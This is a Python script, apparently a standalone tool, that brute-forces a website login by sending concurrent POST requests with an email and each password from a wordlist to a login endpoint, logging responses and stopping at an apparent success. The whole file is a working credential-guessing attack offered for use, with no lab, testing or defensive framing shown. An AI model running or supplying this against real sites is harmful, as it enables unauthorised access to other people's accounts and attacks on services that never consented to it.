import argparse
import asyncio
import aiohttp
import logging
from colorama import Fore
from tqdm import tqdm

async def brute_force(url, endpoint, username, wordlist):
    queue = asyncio.Queue()
    tasks = [asyncio.ensure_future(send_request(url, endpoint, username, password, queue)) for password in tqdm(wordlist)]
    for _ in asyncio.as_completed(tasks):
        result, password = await queue.get()
        if "message" in result:
            logging.info(f"{username}:{password} => {result['message']}")
        else:
            logging.info(f"{username}:{password} => {result}")
            break

async def send_request(url, endpoint, username, password, queue):
    async with aiohttp.ClientSession() as session:
        async with session.post(f"{url}{endpoint}", json={"email": username, "password": password}) as resp:
            result = await resp.json()
            queue.put_nowait((result, password))
            return result



def read_wordlist(filename):
    with open(filename, "r") as file:
        return file.read().splitlines()

def setup_logging(log_file):
    logging.basicConfig(level=logging.INFO, filename=log_file, filemode="w",
                        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--username", help="username for the account", default="foo@bar.com")
    parser.add_argument("-w", "--wordlist", help="wordlist for brute force", default="wordlist.txt")
    parser.add_argument("-U", "--url", help="url for the website", default="https://foo.bar")
    parser.add_argument("-e", "--endpoint", help="endpoint for login", default="/account/login")
    parser.add_argument("-l", "--log", help="log file", default="brute_force.log")
    args = parser.parse_args()

    setup_logging(args.log)

    wordlist = read_wordlist(args.wordlist)
    loop = asyncio.get_event_loop()
    loop.run_until_complete(brute_force(args.url, args.endpoint, args.username, wordlist))
